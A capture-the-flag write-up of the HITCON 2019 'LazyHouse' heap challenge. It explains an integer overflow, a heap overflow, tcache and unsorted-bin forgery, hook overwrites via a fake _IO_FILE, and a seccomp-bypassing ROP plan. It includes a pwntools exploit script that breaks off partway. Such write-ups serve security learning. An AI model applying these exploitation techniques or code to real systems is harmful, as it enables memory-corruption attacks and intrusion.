---
title: HITCON Qualification - LazyHouse
authors: Stefan Blair (fzzyhd)
date: 2019-10-13
categories: binary-exploitation
---

LazyHouse ended up being a 300 point pwn challenge from HITCON Quals 2019.  It was a fairly straightforward menu-based heap binary, using libc version 2.29.

# Reverse Engineering
The binary was fairly simple.  In the .bss segment, there is an 8-element array of `struct house` objects:
```c
struct house
{
    char *house_desc;
    uint64_t size;
    uint64_t price;
};
...
struct house Houses[8];
```
There is also a single `struct super_house` object:
```c
struct super_house
{
    char *house_desc;
    uint64_t size;
    uint64_t price;
    uint64_t unknown;
};
...
struct super_house Superhouse;
```
Finally, there is a global `uint64_t Money = 116630` and a global `int Upgrades = 2`.
Running the process greets us with the following menu:
```
🍊       Lazy House       🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Buy House           $
$   2. Show Lay's house    $
$   3. Sell                $
$   4. Upgrade             $
$   5. Buy a super house   $
$   6. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice:
```
The `Buy House` option lets you allocate a new house:
```c
uint64_t index = get_int();
if (index > 7 || Houses[index].house_desc != NULL)
    return;
  
uint64_t size = get_int();
// size cannot be too small (no fastbin-sizes)
if (size <= 127)
    return;

// we must have enough money
if (218 * size <= Money)
    return;

// this is less than the amount we bought it for!  depreciation :(
Houses[index].price = size << 6;
Houses[index].size = size;
Money -= size * 218;
Houses[index].house_desc = (char*) calloc(1, size);
if (Houses[index].house_desc)
{
    read_string(Houses[index].house_desc, size);
}
```
(I trimmed some irrelevant parts out of the code).  We start out with `116630` of whatever currency is used here, so we can only buy a certain number of houses.  
Throughout the binary, `Money` is a major constraint.  With our starting amount of `Money`, we can only buy a few houses, and when we sell them, their price is only a fraction of what we bought them for.  However, there is an integer overflow bug here that can be exploited to gain practically infinite money.  Theoretically, `size * 218` will always be more than `size << 6`.  However, because these are 64-bit numbers, eventually they will overflow.  At some high enough size, `size * 218` will become 0, and `size << 6` will remain a large number.

The `Show Lay's house` option `write`s the content of a specified house.  The `Sell` option frees a specified house's `house_desc`, adds its price to `Money`, and zeros out the house.

The `Upgrade` option is where we find our next bug:
```c
if (Upgrades <= 0)
    return;

uint64_t index = get_int();
if ( index > 7 || houses[index].house_desc == NULL)
    return;

uint64_t size = houses[index].size;
// blatant buffer overflow here
read_string(Houses[index].house_desc, size + 32);
// upgrading our house has restored the price!
Houses[index].price = size * 218;
// uses up an upgrade
--Upgrades;
```
There is an obvious buffer overflow here, where the program reads in 32 extra characters into the heap-allocated buffer.

Finally, the `Buy a super house` option initializes our `Superhouse`:
```c
if (Superhouse.house_desc)
    return;

if (Money <= 0x216FFFFF)
    exit(535);

Money -= 0x21700000;
char buffer[768];
memset(buffer, 0, 768);
read_string(buffer, 0x217);
Superhouse.house_desc = (char*) malloc(0x217);
memset(Superhouse.house_desc, 0, 0x217);
strncpy(Superhouse.house_desc, buffer, 0x217);
...
```
Note that while the `Buy House` option uses `calloc`, the `Buy a super house` option uses `malloc`.

# (Almost) Infinite Money
As previously mentioned, there is an integer overflow bug.  I asked my friend pernicious to write me a [Z3](https://github.com/Z3Prover/z3) script to figure out what `size` value would meet all the constraints.  We want `size * 218` to end up less than the amount of money we have, so we can actually make the purchase.  We also want `size << 6 > size * 218`, so that when we sell the house, we make a profit.
```python
from z3 import *

sz = BitVec("sz", 64)

s = Solver()

s.add(218 * sz <= 0x1c796)
s.add(sz<<6 > 218*sz)

print "solving..."
print s.check()
m = s.model()
print m
print hex(m[sz].as_long())
```
The script output `0x4b27ed3604b27fb`, which ended up achieving almost infinite money.

# Leaks
The program uses `calloc` for the `Buy House` option, which does not pull from [tcache](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/).  TL;DR, tcache is a per-thread structure that maintains a freelist for each chunk size from `0x20` to `0x410` (I am including space for metadata).  When chunks in that size range are freed, they are added to the tcache, unless that particular size has at least `7` tcache entries, in which case it falls back to the fastbin or unsorted bin.  But `calloc` will not pull from chunks in the tcache.

First, I allocated the following chunks, and then used one of the two `Upgrade`s on `Houses[0].house_desc` to overwrite the size metadata of `Houses[1].house_desc`, such that it absorbs the three chunks below it.  The region shaded with `//////////` is all part of that chunk.
```
+------------+------------+             +------------+------------+
|            |       0x91 |             |            |       0x91 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[0] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |  Upgrade()  | aaaaaaaaaa | aaaaaaaaaa |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa | ----------> | aaaaaaaaaa | aaaaaaaaaa |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+------------+------------+             +------------+------------+
|            |       0x91 |             | aaaaaaaaaa |      0x1d1 |   +-----------+------+
+------------+------------+          +--+------------+------------+   | Houses[1] | 0x80 |
| ////////// | ////////// |          |  | ////////// | ////////// |   +-----------+------+
| ////////// | ////////// |          |  | ////////// | ////////// |
| ////////// | ////////// |          |  | ////////// | ////////// |
+------------+------------+          |  +------------+------------+
|            |       0x91 |          |  | ////////// |       0x91 |   +-----------+------+
+------------+------------+        N |  +------------+------------+   | Houses[2] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |        e |  | ////////// | ////////// |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |        w |  | ////////// | ////////// |
| aaaaaaaaaa | aaaaaaaaaa |          |  | ////////// | ////////// |
+------------+------------+        C |  +------------+------------+
|            |       0x91 |        h |  | ////////// |       0x91 |   +-----------+------+
+------------+------------+        u |  +------------+------------+   | Houses[3] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |        n |  | ////////// | ////////// |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |        k |  | ////////// | ////////// |
| aaaaaaaaaa | aaaaaaaaaa |          |  | ////////// | ////////// |
+------------+------------+          |  +------------+------------+
|            |      0x4b1 |          |  | ////////// |      0x4b1 |   +-----------+------+
+------------+------------+          |  +------------+------------+   | Houses[4] | 0x4a0|
| aaaaaaaaaa | aaaaaaaaaa |          |  | ////////// | ////////// |   +-----------+------+
|       0x00 |      0x4a1 |          |  | ////////// |      0x4a1 |
| aaaaaaaaaa | aaaaaaaaaa |          +--+------------+------------+
            ...                                     ...
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+------------+------------+             +------------+------------+
|            |       0x91 |             |            |       0x91 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[5] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+-------------------------+             +-------------------------+
```
The `Show Lay's house` command will `write` out the full contents of `Houses[i].house_desc`, of length `Houses[i].size`.  By `free`ing our new `0x1d0`-sized chunk, and then allocating a _new_ house of size `0x1c0` (chunk size - metadata size), it will take the same spot, but this time with a larger `Houses[1].size` value, allowing us to print the chunks that we absorbed.  Note that the size of our new chunk is `0x1d0`, which can fit in the tcache, so before freeing this chunk, the size's entry in the tcache must be filled.  This can be done by allocating and freeing 7 houses with this size.  An alternative would be to choose a size that is too large for the tcache.  
```
+------------+------------+             +------------+------------+
|            |       0x91 |             |            |       0x91 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[0] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+------------+------------+    Sell()   +------------+------------+
| aaaaaaaaaa |      0x1d1 |  Buy(0x4a0) | aaaaaaaaaa |      0x1d1 |   +-----------+------+
+------------+------------+ ----------> +------------+------------+   | Houses[1] | 0x1c0|
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |   +-----------+------+
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |
+------------+------------+             | - - - - - -|- - - - - - |
| ////////// |       0x91 |             | 0x00000000 |       0x21 |   +-----------+------+
+------------+------------+             | - - - - - -|- - - - - - |   | Houses[2] | 0x80 |
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |   +-----------+------+
| ////////// | ////////// |             | 0x00000000 |       0x71 |
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |
+------------+------------+             | - - - - - -|- - - - - - |
| ////////// |       0x91 |             | 0x00000000 |       0x31 |   +-----------+------+
+------------+------------+             | - - - - - -|- - - - - - |   | Houses[3] | 0x80 |
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |   +-----------+------+
| ////////// | ////////// |             | 0x00000000 | 0x00000000 |
| ////////// | ////////// |             | 0x00000000 |       0x61 |
+------------+------------+                         ...
| ////////// |      0x4b1 |             | 0x00000000 |      0x4b1 |   +-----------+------+
+------------+------------+             | 0x00000000 | 0x00000000 |   | Houses[4] | 0x4a0|
| ////////// | ////////// |             +------------+------------+   +-----------+------+
| ////////// |      0x4a1 |             |       0x00 |      0x4a1 |
+------------+------------+             +------------+------------+
            ...                                     ...
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+------------+------------+             +------------+------------+
|            |       0x91 |             |            |       0x91 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[5] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+-------------------------+             +-------------------------+
```
Note that `calloc` will set returned memory to `0`, so when we fill in the new house (`Houses[1].house_desc`), we must recreate the chunk metadata for the three absorbed chunks (`0x91`, `0x91`, `0x4b1`).  However, I replaced the first `0x91` chunk with a `0x21` chunk, and the second `0x91` chunk with a `0x31` chunk.  This will be explained in a moment.  First, lets get some leaks.

Now, we have a house (`Houses[1]`) which _contains_ these other three chunks.  If we `free` those three chunks, we can print out their metadata, which contain `libc` and `heap` pointers.
```
+------------+------------+             +------------+------------+
|            |       0x91 |             |            |       0x91 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[0] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+------------+------------+             +------------+------------+
| aaaaaaaaaa |      0x1d1 |             | aaaaaaaaaa |      0x1d1 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[1] | 0x1c0|
| 0x00000000 | 0x00000000 |             | 0x00000000 | 0x00000000 |   +-----------+------+
| 0x00000000 | 0x00000000 |             | 0x00000000 | 0x00000000 |
| 0x00000000 | 0x00000000 |             | 0x00000000 | 0x00000000 |
+------------+------------+             +------------+------------+
| 0x00000000 |       0x21 |    Sell()   | 0x00000000 |       0x21 |   +-----------+------+
+------------+------------+ ----------> +------------+------------+   | Houses[2] | ---- |
| 0x00000000 | 0x00000000 |             | 0x00000000 |  heap ptr  |   +-----------+------+
| 0x00000000 |       0x71 |             | 0x00000000 |       0x71 |
| 0x00000000 | 0x00000000 |             | 0x00000000 | 0x00000000 |
+------------+------------+             +------------+------------+
| 0x00000000 |       0x31 |    Sell()   | 0x00000000 |       0x31 |   +-----------+------+
+------------+------------+ ----------> +------------+------------+   | Houses[3] | ---- |
| 0x00000000 | 0x00000000 |             | 0x00000000 |  heap ptr  |   +-----------+------+
| 0x00000000 | 0x00000000 |             | 0x00000000 | 0x00000000 |
| 0x00000000 |       0x61 |             | 0x00000000 |       0x61 |
            ...                                     ...
| 0x00000000 |      0x4b1 |    Sell()   | 0x00000000 |      0x4b1 |   +-----------+------+
+------------+------------+ ----------> +------------+------------+   | Houses[4] | ---- |
| 0x00000000 | 0x00000000 |             |  libc ptr  |  libc ptr  |   +-----------+------+
|       0x00 |      0x4a1 |             |       0x00 |      0x4a1 |
+------------+------------+             +------------+------------+
            ...                                     ...
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+------------+------------+             +------------+------------+
|            |       0x91 |             |            |       0x91 |   +-----------+------+
+------------+------------+             +------------+------------+   | Houses[5] | 0x80 |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |   +-----------+------+
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
| aaaaaaaaaa | aaaaaaaaaa |             | aaaaaaaaaa | aaaaaaaaaa |
+-------------------------+             +-------------------------+
```
Now we can call `Show Lay's house` to get those leaks.  The libc leaks come from the libc pointers.  The freed chunk there is of size `0x4b0`, which is too large to fit in the tcache and is instead part of the unsorted bin.  Those pointers are part of the unsorted bin linked list.  The heap pointers in the `0x20` and `0x30` sized tcache chunks come from a [new addition](http://www.auxy.xyz/modern%20binary%20exploitation/2018/11/22/TCache-Exp.html) to libc version 2.29.  Tcache chunks now have a pointer to their `struct tcache_perthread_struct`, which happens to be on the heap.

# Exploit
As discussed above, [tcache](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/) is a heap optimization where each thread has a structure, illustrated below, that caches free chunks.  This structure is actually allocated on the heap.
```
                                                        struct tcache_perthread_struct
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
|   |   |   |   |   |   |   |   ||   |   |   |   |   |   |   |   | {
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
|   |   |   |   |   |   |   |   ||   |   |   |   |   |   |   |   |
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+ char counts[64];
|   |   |   |   |   |   |   |   ||   |   |   |   |   |   |   |   |
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
|   |   |   |   |   |   |   |   ||   |   |   |   |   |   |   |   |
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
|   linked list for size 0x20   ||   linked list for size 0x30   |
+-------------------------------++-------------------------------+
|   linked list for size 0x40   ||   linked list for size 0x50   | tcache_entry *entries[64];
+-------------------------------++-------------------------------+
|   linked list for size 0x50   ||   linked list for size 0x70   |
+-------------------------------++-------------------------------+
                               ....
+-------------------------------++-------------------------------+
|                               ||                               |
+-------------------------------++-------------------------------+ }
```
Each `tcache_entry*` is a chunk, and the array of `tcache_entry*`s is an array of linked lists, one for each size.  The `counts` array contains the corresponding number of chunks in each linked list.  Something interesting about tcache, is that when a pointer in a freelist is removed to satisfy an allocation (i.e. from `malloc`), no checks are done on that pointer.  In our program, the `Buy a super house` function performs a single `malloc` call of size `0x218`.  This can only be done once.  If we can get the corresponding freelist in the `tcache_perthread_struct` to point somewhere we control, we can get an arbitrary write.

Lets take a look at the `tcache_perthread_struct` after we have our leaks:
```
                                                        struct tcache_perthread_struct
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 | 0 | 1 | 0 | 1 || 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | {
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 || 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+ char counts[64];
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 || 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+ ---+
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 || 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |    |
+---+---+---+---+---+---+---+---++---+---+---+---+---+---+---+---+    | Forged unsorted-bin
|       0x4343434343434343      ||       0x4444444444444444      |    |
+-------------------------------++-------------------------------+ ---+
|       0x0000000000000000      ||       0x0000000000000000      | tcache_entry *entries[64];
+-------------------------------++-------------------------------+
|       0x0000000000000000      ||       0x0000000000000000      |
+-------------------------------++-------------------------------+
                               ....
+-------------------------------++-------------------------------+
|       0x0000000000000000      ||       0x0000000000000000      |
+-------------------------------++-------------------------------+ }
```
The `0x4343434343434343` and `0x4444444444444444` are pointers to the `0x20` and `0x30` chunks we just freed.
By freeing an `0x20` and `0x30` sized chunk earlier, we now have the correct metadata to forge a chunk _within_ this `tcache_perthread_struct` into the unsorted bin.  We needed them to be that size, so that those two pointers would boarder the `char counts[64]` array.  Using this array, we can forge a `size | prev_inuse` for our chunk (more on that later).  If we can allocate this chunk, we can overwrite the entire `tcache_perthread_struct`, including the freelist we need to control.  Lets take another look at the heap.
```
                         ...
     +--------------------+--------------------+
     |   0|0|0|0|0|0|0|0  |  0|0|0|0|0|0|0|0   |                      tcache_perthread_struct
     +--------------------+--------------------+
 +---|-0x4343434343434343 | 0x4444444444444444-|------+
 |   +--------------------+--------------------+      |
 |   | 0x0000000000000000 | 0x0000000000000000 |      |
 |   +--------------------+--------------------+      |
 |                       ...                          |
 |   +--------------------+--------------------+      |
 |   |                    |               0x91 |      |                  +-----------+------+
 |   +--------------------+--------------------+      |                  | Houses[0] | 0x80 |
 |   |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaa  |      |                  +-----------+------+
 |   |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaa  |      |
 |   |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaa  |      |
 |   +--------------------+--------------------+      |
 |   |  aaaaaaaaaaaaaaaa  |              0x1d1 |      |                  +-----------+------+
 |   +--------------------+--------------------+      |                  | Houses[1] | 0x1c0|
 |   | 0x0000000000000000 | 0x0000000000000000 |      |                  +-----------+------+
 |   | 0x0000000000000000 | 0x0000000000000000 |      |
 |   | 0x0000000000000000 | 0x0000000000000000 |      |
 |   +--------------------+--------------------+      |
 +-> | 0x0000000000000000 |               0x21 |      |                  +-----------+------+
     +--------------------+--------------------+      |                  | Houses[2] | ---- |
     | 0x0000000000000000 | 0x4242424242424242 |      |                  +-----------+------+
     | 0x0000000000000000 |               0x71 |      |
     | 0x0000000000000000 | 0x0000000000000000 |      |
     +--------------------+--------------------+      |
     | 0x0000000000000000 |               0x31 | <----+                  +-----------+------+
     +--------------------+--------------------+                         | Houses[3] | ---- |
     | 0x0000000000000000 | 0x4242424242424242 |                         +-----------+------+
     | 0x0000000000000000 | 0x0000000000000000 |
     | 0x0000000000000000 |               0x61 |
                         ...
+--> | 0x0000000000000000 |              0x4b1 | <----------+            +-----------+------+
|    +--------------------+--------------------+            |            | Houses[4] | ---- |
|  +-|-0x4545454545454545 | 0x4545454545454545-|------+     |            +-----------+------+
|  | |               0x00 |              0x4a  |      |     |
|  | +--------------------+--------------------+      |     |
|  |                     ...                          |     |
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |      |     |
|  | +--------------------+--------------------+      |     |
|  | |                    |               0x91 |      |     |            +-----------+------+
|  | +--------------------+--------------------+      |     |            | Houses[5] | 0x80 |
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |      |     |            +-----------+------+
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |      |     |
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |      |     +-------------------------------+
|  | +-----------------------------------------+      |                                     |
|  |                                                  |                                     |
|  |                                                  v                                     |
|  |                                           +--------------------+--------------------+  |
|  +-----------------------------------------> | unsorted list head |                    |  |
|                                              +--------------------+---------+----------+  |
+----------------------------------------------|-0x4141414141414141 | 0x4141414141414141-|--+
                                               +--------------------+--------------------+               
```
Right now, the unsorted bin linked list only includes the big chunk we freed from `Houses[4].house_desc`.  But if we use our second `Upgrade` on `Houses[1]`, we can completely change this linked list to include the fake chunk in the tcache.

When `malloc` searches the unsorted bin, it [iterates through each chunk's `bk` pointer](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3740).
```
+--------------------+--------------------+
|       prev size    |  size | prev_inuse |
+--------------------+--------------------+
|   forward pointer  |  backward pointer  |
                    ...
```
Additionally, there are some constraints on the chunks due to checks performed:
1. The next chunk in memory (address of chunk + chunk size) must have the correct prev size ([source](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3751))
2. The next chunk in memory must not have its prev_inuse bit set ([source](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3758))
3. Each chunk must have `chunk->fd->bk == chunk` and `chunk->bk->fd == chunk` ([source](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3756))

Now, if we request a chunk of the exact size from the unsorted bin, it will be [returned to us](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3804).  However, if that size is a tcache size, the corresponding tache bin must [also be filled](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3812).

Putting these constraints all together, we write the following using the `Upgrade` command:
```
                         ...
     +--------------------+--------------------+
+--> |   0|0|0|0|0|0|0|0  |  0|0|0|0|0|3|0|1   | <------------+       tcache_perthread_struct
|    +--------------------+--------------------+              |
| +--|-0x4343434343434343 | 0x4444444444444444-|------+       |
| |  +--------------------+--------------------+      |       |
| |  | 0x0000000000000000 | 0x0000000000000000 |      |       |
| |  +--------------------+--------------------+      |       |
| |                      ...                          |       |
| |  +--------------------+--------------------+      |       |
| |  |              0x300 |              0xXX0 |      |       |
| |  +--------------------+--------------------+      |       |
| |                      ...                          |       |
| |  +--------------------+--------------------+      |       |
| |  |                    |               0x91 |      |       |          +-----------+------+
| |  +--------------------+--------------------+      |       |          | Houses[0] | 0x80 |
| |  |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaa  |      |       |          +-----------+------+
| |  |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaa  |      |       |
| |  |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaa  |      |       |
| |  +--------------------+--------------------+      |       |
| |  |  aaaaaaaaaaaaaaaa  |              0x1d1 |      |       |          +-----------+------+
| |  +--------------------+--------------------+      |       |          | Houses[1] | 0x1c0|
| |  | 0x0000000000000000 | 0x0000000000000000 |      |       |          +-----------+------+
| |  | 0x0000000000000000 | 0x0000000000000000 |      |       |
| |  | 0x0000000000000000 | 0x0000000000000000 |      |       |
| |  +--------------------+--------------------+      |       |
| +> | 0x0000000000000000 |               0x21 | <----|----+  |          +-----------+------+
|    +--------------------+--------------------+      |    |  |          | Houses[2] | ---- |
| +--|-0x4141414141414141 | 0x4040404040404040-|------|----|--+          +-----------+------+
| |  |               0x20 |               0x70 |      |    |
| |  | 0x0000000000000000 | 0x0000000000000000 |      |    |
| |  +--------------------+--------------------+      |    |
| |  | 0x0000000000000000 |               0x31 | <----+    |             +-----------+------+
| |  +--------------------+--------------------+           |             | Houses[3] | ---- |
+----|-0x4040404040404040 | 0x4242424242424242-|---+   +---+             +-----------+------+
  |  | 0x0000000000000000 | 0x0000000000000000 |   |   |
  |  |               0x30 |               0x60 |   |   |
  |                      ...                       |   |
+-+> | 0x0000000000000000 |              0x4b1 | <----------+            +-----------+------+
|    +--------------------+--------------------+   |   |    |            | Houses[4] | ---- |
|  +-|-0x4545454545454545 | 0x4343434343434343-|-------+    |            +-----------+------+
|  | |               0x00 |              0x4a1 |   |        |
|  | +--------------------+--------------------+   |        |
|  |                     ...                       |        |
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |   |        |
|  | +--------------------+--------------------+   |        |
|  | |                    |               0x91 |   |        |            +-----------+------+
|  | +--------------------+--------------------+   |        |            | Houses[5] | 0x80 |
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |   |        |            +-----------+------+
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |   |        |
|  | |  aaaaaaaaaaaaaaaa  |  aaaaaaaaaaaaaaaaa |   |        +-------------------------------+
|  | +-----------------------------------------+   |                                        |
|  |                                               |                                        |
|  |                                               v                                        |
|  |                                           +--------------------+--------------------+  |
|  +-----------------------------------------> | unsorted list head |                    |  |
|                                              +--------------------+--------------------+  |
+----------------------------------------------|-0x4141414141414141 | 0x4141414141414141-|--+
                                               +--------------------+--------------------+
```
For the `tcache_perthread_struct` chunk, to get the `size | prev_inuse == 0x301`, allocate and free 3 houses with chunks of size `0x3a0` and one of size `0x390`.  Those two sizes correspond to the first two bytes of the chunk's `size | prev_inuse`.

Now, when we allocate a chunk of size `0x300`, or a house of size `0x2f0`, the returned chunk will be within the `tcache_perthread_struct`.  From there, we can set the linked list for houses of size `0x217`.  Before that overwrite, though, allocate and free a single house of size `0x217`, so that the corresponding `count` within the `tcache_perthread_struct` is equal to 1.

With an arbitrary write, I would normally just use one-gadget or ret2 system to get a shell.  However, our program uses a [seccomp filter](https://lwn.net/Articles/656307/) to only allow the following syscalls:
```
 rt_sigreturn
 exit_group
 exit
 open
 read
 write
 brk
 mmap
 mprotect
 close
```
While I searched for gadgets that could be used to pivot and ROP to open and read the flag file, my friend pernicious used the following technique to get a stack leak and ROP from there:

First, overwrite `__free_hook` with `__uflow` (the function intended to read from a file stream).  Next, free a fake [`_IO_FILE` struct](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique) such that when `__uflow` is called:
1.  writes out a stack address.  
    If the file struct is currently putting, it will [switch to get mode](https://code.woboq.org/userspace/glibc/libio/genops.c.html#306), which will flush any pending writes. Essentially, if we set up the fake struct correctly, `write(fp->_fileno, fp->_IO_write_base, fp->_IO_write_ptr - fp->_IO_write_base)` will be called, so we point `_IO_write_base` at `environ` within libc.
2.  reads into `__malloc_hook`.  
    Again, if we set the struct up correctly, `read(fp->_fileno, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base)` will be called, so we point `_IO_buf_base` at `__malloc_hook`.  
    Note that `fp->_fileno` is used to both read and write. This works because stdin/stdout are both the socket used to handle the connection, meaning both are readable and writeable.

Overwrite `__malloc_hook` with `gets`.  
Since we can create a house with arbitrary size, we can control the argument to `calloc`/`__malloc_hook`/`gets`.
So we allocate a new house with `size` equal to the stack location of the return address of `gets`, such that we gain control when `gets` returns.  From there, write a ROP chain to open/read/write the flag file.

# Final Exploit Script
```python
import sys
from pwn import *
context.arch="amd64"
libc = ELF("./libc.so.6", False)
if 'rem' in sys.argv:
    p = remote("3.115.121.123", 5731)
else:
    if '-d' in sys.argv:
        os.system("sudo docker exec ub19 pkill -9 chall")
        os.system("sudo docker exec ub19 pkill -9 gdb")
    p = remote('0', 1339)
    if '-d' in sys.argv:
        os.system("sudo docker exec ub19 pidof chall > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        codebase
        b free
        c
        del
        heap
        set $houses = $code+0x5060
        boff 0x23b4
        b malloc_printerr
        #b *($code+0x1f4e)
        b *gets+235
        c
        #c 23
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("sudo docker cp /tmp/script.gdb ub19:/tmp/script.gdb")
        run_in_new_terminal("sudo docker exec -it ub19 gdb -q /chall %d -x /tmp/script.gdb"%pid)
        pid = pidof("chall")[0]
        proc.wait_for_debugger(pid)
mapping = [0] * 8
def send_wrapped(s, l, f='\x00'):
    p.send(s.ljust(l, f))
def buy_house(index, size, house, sleep_nowrap=False):
    send_wrapped('1', 32)
    send_wrapped(str(index), 32)
    send_wrapped(str(size), 32)
    if sleep_nowrap:
        p.send(house)
        if 'rem' in sys.argv:
            time.sleep(1)
        else:
            time.sleep(0.4)
    else:
        send_wrapped(house, size)
    mapping[index] = size
def buy_house_massive(index, size):
    send_wrapped('1', 32)
    send_wrapped(str(index), 32)
    send_wrapped(str(size), 32)
def show_house(index):
    p.clean(1)
    send_wrapped('2', 32)
    send_wrapped(str(index), 32)
    return p.readuntil('$$$$$$$$$$$$$$$$$$$$$$$$$$$$').replace('$$$$$$$$$$$$$$$$$$$$$$$$$$$$', '')
def sell_house(index):
    send_wrapped('3', 32)
    send_wrapped(str(index), 32)
def update_house(index, house):
    send_wrapped('4', 32)
    send_wrapped(str(index), 32)
    send_wrapped(house, mapping[index] + 32)
def buy_super_house(house):
    send_wrapped('5', 32)
    p.send(house)
    time.sleep(0.4)
def build_destroy(index, size, house, sleep_nowrap=False):
    buy_house(index, size, house, sleep_nowrap)
    sell_house(index)
# get infinite money
buy_house_massive(0, 338472368324945915)
sell_house(0)
for i in range(3):
    build_destroy(6, 0x3a0, 'A' * 224 + p64(0x300) + p64(0x2c0), True)
for i in range(7):
    build_destroy(0, 0x1c0, 'A', True)
buy_house(0, 128, 'A')
buy_house(1, 128, 'B')
buy_house(2, 128, 'C' * 16 + p64(0) + p64(0x71))
buy_house(5, 128, 'F' * 128)
buy_house(3, 1200, 'D' * 16 + p64(0) + p64(0x4a1), True)
buy_house(4, 128, 'E')
build_destroy(6, 0x390, 'G' * 1200, True)
for i in range(7):
    build_destroy(6, 0x2f0, 'A' * 0x2f0, True)
build_destroy(6, 0x217, 'A', True)
# we can easily extend this into a heap leak
# by just allocating and freeing another thing, such
# that its also in the unsorted bin
update_house(0, 'A' * 128 + p64(0) + p64(0x1d1))
sell_house(1)
# maybe make this one a little bit longer so we can overwrite and
# free some tiny-sized tcache chunks!  Then free them and
# forge
